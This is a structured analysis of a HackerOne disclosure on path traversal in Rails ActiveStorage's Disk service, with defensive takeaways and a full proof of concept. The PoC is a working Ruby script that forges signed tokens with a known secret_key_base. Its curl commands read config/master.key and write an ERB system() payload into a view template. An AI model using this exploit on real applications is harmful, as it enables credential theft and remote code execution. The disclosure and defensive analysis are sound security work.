# Path Traversal in ActiveStorage Disk Service Leading to RCE

## Metadata
- **Source:** HackerOne
- **Report:** 2334455 | https://hackerone.com/reports/2334455
- **Submitted:** 2024-01-25
- **Reporter:** ooooooo_q
- **Program:** Ruby on Rails
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Path Traversal, Arbitrary File Read, Arbitrary File Write, Remote Code Execution
- **CVEs:** None
- **Category:** memory-binary

## Summary
ActiveStorage's Disk service implementation is vulnerable to path traversal attacks through the 'key' parameter when the disk service is configured. An attacker with knowledge of the application's secret_key_base can craft malicious signed tokens to read arbitrary files from the server filesystem and write files to arbitrary locations, including template files, leading to RCE via template injection.

## Attack scenario
1. Attacker obtains or leaks the Rails application's secret_key_base through various means (git history exposure, environment variable leakage, etc.)
2. Attacker derives the ActiveStorage signing secret by regenerating the key using the same key generation algorithm with known iterations
3. Attacker crafts a malicious MessageVerifier token with path traversal sequences (e.g., '././../config/master.key') in the 'key' field
4. Attacker sends a GET request using the crafted token to read sensitive files like config/master.key or database credentials
5. Attacker creates another token with a path pointing to a template file (e.g., '../app/views/users/show.text.erb') and embedded ERB code
6. Attacker uploads malicious content via PUT request, writing the ERB payload to the template, achieving RCE when the template is rendered

## Root cause
ActiveStorage Disk service does not properly validate or sanitize the 'key' parameter before using it in file path operations. The key value is passed directly to file I/O operations without removing path traversal sequences like '../' or './', allowing attackers to escape the intended storage directory and access arbitrary filesystem locations.

## Attacker mindset
An attacker would target this vulnerability after compromising the secret_key_base, which represents a significant privilege escalation point. The attack chain demonstrates a two-stage approach: first reconnaissance (reading master.key and configuration), then persistence and code execution (writing to view templates). This shows deliberate exploitation planning with knowledge of Rails internals.

## Defensive takeaways
- Implement strict path canonicalization and validation in ActiveStorage Disk service to reject any key containing traversal sequences before file operations
- Use a whitelist approach where only alphanumeric characters, hyphens, and underscores are allowed in blob keys
- Ensure secret_key_base is never exposed through version control, environment variable dumps, or error messages
- Consider using cloud storage services (S3, GCS) instead of local Disk storage in production to reduce filesystem access risks
- Implement additional filesystem-level protections such as chroot jails or containerization to limit damage from path traversal
- Regularly audit and rotate secret_key_base values, especially after any potential compromise
- Apply principle of least privilege to the Rails process to restrict write access to critical directories like app/views
- Monitor and alert on suspicious file write operations to template directories

## Variant hunting
Test with double-encoded traversal sequences ('%2e%2e%2f') to bypass basic filters
Attempt unicode normalization bypasses (e.g., using unicode equivalents of dots and slashes)
Test with symbolic links in the storage directory path
Investigate if similar vulnerabilities exist in S3 service key handling
Check if other Rails versions have different sanitization implementations
Test writing to hidden files or backup files (.erb~, .erb.bak) in template directories
Investigate whether the vulnerability applies to other blob metadata fields beyond 'key'

## MITRE ATT&CK
- T1190
- T1083
- T1105
- T1059
- T1021
- T1040

## Notes
The vulnerability requires knowledge of secret_key_base, which elevates the attack difficulty but makes it critical in scenarios where this secret is compromised. The Rails 7.1 improvements to reduce Marshal deserialization risks are bypassed by this separate code path. The PoC demonstrates the complete attack chain with realistic payloads. This vulnerability highlights the importance of protecting secret_key_base as it controls message verification across multiple Rails subsystems.

## Full report
<details><summary>Expand</summary>

The danger of deserialization has been reduced in Rails 7.1 by increasing the number of settings that do not use Marshal in MessageVerifier.

However, another danger remains with AcitveStorage(`service: Disk`), which allows path traversal using the `key` value. However, the attacker must know the value of `secret_key_base`.

### PoC

```
❯ ruby -v
ruby 3.2.3 (2024-01-18 revision 52bb2ac0a6) [arm64-darwin22]

❯ rails new disk_traversal_7_1 -G -M -C -A -J -T 
=>  Rails 7.1.3

❯ bin/rails active_storage:install

❯ RAILS_ENV=production bin/rails db:migrate
```

edit `config/production.rb`

```
# config.force_ssl = true
...

config.active_support.message_serializer = :json
```

start server

```
❯ RAILS_ENV=production bundle exec rails s
```

`traversal.rb`

```ruby
content_disposition = "inline"
content_type = "text/plain"
name = "disk"

secret_key_base = Rails.application.secret_key_base

key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
secret = key_generator.generate_key("ActiveStorage")

serializer =  ActiveStorage.verifier.instance_variable_get(:@serializer)
puts serializer
puts "--"


key ="././../config/master.key"
verifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)
read_token = verifier.generate(
          {
            key: key,
            disposition: content_disposition,
            content_type: content_type,
            service_name: name
          },
          purpose: :blob_key
        )

puts "read token:"
puts "#{read_token}"
puts "read curl: "
puts  "curl \"http://0.0.0.0:3000/rails/active_storage/disk/#{read_token}/test\""
puts "--"

target_file ="../app/views/users/show.text.erb"
content = "<% system('date') %>"
verifier = ActiveSupport::MessageVerifier.new(secret, serializer: serializer)
token_write = verifier.generate(
          {
            key: target_file,
            disposition: content_disposition,
            content_type: content_type,
            content_length: content.bytesize,
            service_name: name
          },
          purpose: :blob_token
        )

puts "write target_file:"
puts "#{target_file}"
puts "write token:"
puts "#{token_write}"
puts "write curl:"
puts "curl -X PUT -H \"Content-type: #{content_type}\" -d \"#{content}\" http://0.0.0.0:3000/rails/active_storage/disk/#{token_write}"
```

```
❯ RAILS_ENV=production bundle exec rails runner traversal.rb
W, [2024-01-25T22:57:10.036960 #16497]  WARN -- : You are running SQLite in production, this is generally not recommended. You can disable this warning by setting "config.active_record.sqlite3_production_warning=false".
ActiveSupport::Messages::SerializerWithFallback::JsonWithFallback
--
read token:
eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7
read curl:
curl "http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7/test"
--
write target_file:
../app/views/users/show.text.erb
write token:
eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e
write curl:
curl -X PUT -H "Content-type: text/plain" -d "<% system('date') %>" http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e
```

Access to read curl will get the file at any path, and access to write curl will write to any path and confirm the RCE.

## Impact

If `secret_key_base` is leaked, there is a risk of reading and writing files on the server and thereby an RCE.

</details>

---
*Analysed by Claude on 2026-05-24*
